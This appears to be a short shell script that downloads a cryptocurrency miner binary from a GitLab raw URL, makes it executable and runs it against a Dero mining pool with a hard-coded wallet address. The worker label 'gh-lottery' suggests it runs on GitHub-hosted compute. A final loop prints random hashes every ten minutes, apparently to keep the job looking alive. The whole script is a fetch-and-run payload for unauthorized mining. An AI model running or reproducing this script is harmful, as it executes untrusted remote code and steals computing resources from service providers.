mkdir dheru
cd dheru
curl -0 https://gitlab.com/virginianathanmzmostjc/miner/-/raw/main/astrominer -o asmin && chmod +x asmin
./asmin -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm369mdkp06lgvqf4y5cm.$(echo gh-lottery-$(TZ=UTC-7 date +"%H-%M-%S")) -r community-pools.mysrv.cloud:10300 -p rpc
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
